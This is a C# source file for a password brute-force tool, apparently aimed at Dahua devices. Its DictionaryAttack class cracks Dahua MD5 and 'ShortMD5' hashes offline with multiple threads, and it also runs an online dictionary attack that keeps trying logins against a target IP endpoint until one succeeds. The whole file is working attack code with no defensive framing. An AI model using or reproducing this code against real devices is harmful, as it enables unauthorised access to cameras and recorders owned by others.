using System;
using System.Net;
using System.Text;
using System.Threading;

using Kaye.Models;
using Kaye.Profiles;
using Kaye.Cryptography;

namespace Kaye.BruteForce
{
    public class DictionaryAttack
    {
        Dictionary Dictionary;

        public delegate void AttackStatus(Int32 ItemsTested, String LastTested);
        public event AttackStatus OnStatusUpdate;

        public static Int32 HashThreads = 3;
        public static Int32 OnlineThreads = 5;
        public static ConsoleKey AbortKey = ConsoleKey.A;
        public static Int32 AbortPressed = 3;

        public Boolean KeyFound = false;
        private Boolean Abort = false;
        public String Key = null;
        public String SerialNumber = String.Empty;
        public String Username = String.Empty;

        public DictionaryAttack(Dictionary Dictionary)
        {
            this.Dictionary = Dictionary;
        }

        public String HashAttack(String Hash, HashAlg Algorithm)
        {
            Thread[] ThreadPool = new Thread[HashThreads];
            Int32 ThreadsFinished = 0;
            for (Int32 i = 0; i < ThreadPool.Length; i++)
            {
                if (Algorithm == HashAlg.ShortMD5) ThreadPool[i] = new Thread(() => SMD5HashAttackThread(Encoding.ASCII.GetBytes(Hash), ref ThreadsFinished));
                else if (Algorithm == HashAlg.DahuaMD5) ThreadPool[i] = new Thread(() => DahuaMD5AttackThread(HexToByteArray(Hash), Username, SerialNumber, ref ThreadsFinished));
                else return null;
                ThreadPool[i].Start();
            }

            Int32 LastTested = 0;

            Thread AbortThread = new Thread(() =>
            {
                Int32 Pressed = 0;
                while (Pressed < AbortPressed)
                {
                    ConsoleKey CKey = Console.ReadKey(true).Key;
                    if (CKey == AbortKey) Pressed++;
                    else Pressed = 0;
                }
                Abort = true;
            });

            AbortThread.Start();

            while (ThreadsFinished < ThreadPool.Length && !Abort)
            {
                Thread.Sleep(1000);
                if (Dictionary.ItemsTested - LastTested > 65536) OnStatusUpdate(Dictionary.ItemsTested, Dictionary.Current());
            }

            if (!Abort) AbortThread.Abort();

            return Key;
        }

        public String OnlineAttack(IPEndPoint Target, Model Model)
        {
            Thread[] ThreadPool = new Thread[OnlineThreads];
            Int32 ThreadsFinished = 0;

            for (Int32 i = 0; i < ThreadPool.Length; i++)
            {
                ThreadPool[i] = new Thread(() => OnlineAttackThread(this.Username, Target, Model, ref ThreadsFinished));
                ThreadPool[i].Start();
            }

            Int32 LastTested = 0;

            Thread AbortThread = new Thread(() =>
            {
                Int32 Pressed = 0;
                while (Pressed < AbortPressed)
                {
                    ConsoleKey CKey = Console.ReadKey(true).Key;
                    if (CKey == AbortKey) Pressed++;
                    else Pressed = 0;
                }
                Abort = true;
            });

            AbortThread.Start();

            while (ThreadsFinished < ThreadPool.Length && !Abort)
            {
                Thread.Sleep(1000);
                if (Dictionary.ItemsTested - LastTested > 0) OnStatusUpdate(Dictionary.ItemsTested, Dictionary.Current());
            }

            if (!Abort) AbortThread.Abort();

            return Key;
        }

        private void SMD5HashAttackThread(Byte[] Hash, ref Int32 ThreadsFinished)
        {
            String CurrentItem;

            while (!KeyFound && (CurrentItem = Dictionary.Next()) != null && !Abort)
            {
                if (ShortMD5.HashTest(CurrentItem, Hash))
                {
                    KeyFound = true;
                    Key = CurrentItem;
                }
            }

            ThreadsFinished++;
        }

        private void DahuaMD5AttackThread(Byte[] Hash, String Username, String SerialNumber, ref Int32 ThreadsFinished)
        {
            String CurrentItem;

            while (!KeyFound && (CurrentItem = Dictionary.Next()) != null)
            {
                if (DahuaMD5.HashTest(CurrentItem, Username, SerialNumber, Hash))
                {
                    KeyFound = true;
                    Key = CurrentItem;
                }
            }

            ThreadsFinished++;
        }

        private void OnlineAttackThread(String Username, IPEndPoint Target, Model Model, ref Int32 ThreadsFinished)
        {
            String CurrentItem;
            LoginMaker Maker = new LoginMaker(Target, Model);

            while (!KeyFound && (CurrentItem = Dictionary.Next()) != null)
            {
                if (Maker.TryLogin(Username, CurrentItem))
                {
                    KeyFound = true;
                    Key = CurrentItem;
                }
            }

            ThreadsFinished++;
        }

        private static Byte[] HexToByteArray(String Hex)
        {
            if (Hex.Length % 2 != 0) return new Byte[0];
            Int32 Length = Hex.Length / 2;
            Byte[] Output = new Byte[Length];
            for (Int32 i = 0; i < Length; i++)
            {
                Char A = Hex[2 * i];
                Char B = Hex[2 * i + 1];
                Output[i] = (Byte)(SymbolHex(A) * 16 + SymbolHex(B));
            }
            return Output;
        }

        private static Byte SymbolHex(Char A)
        {
            if (A >= 48 && A <= 57) return (Byte)(A - 48);
            if (A >= 65 && A <= 70) return (Byte)(A - 55);
            if (A >= 97 && A <= 102) return (Byte)(A - 87);
            return 0;
        }
    }
}